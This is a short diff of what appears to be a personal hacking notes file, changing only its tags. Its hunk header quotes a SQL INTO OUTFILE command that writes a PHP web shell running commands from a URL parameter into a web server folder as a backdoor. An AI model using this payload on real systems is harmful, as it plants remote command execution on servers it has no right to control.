@@ -9,4 +9,4 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoo
 - ~/kb/hacking/common-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #common
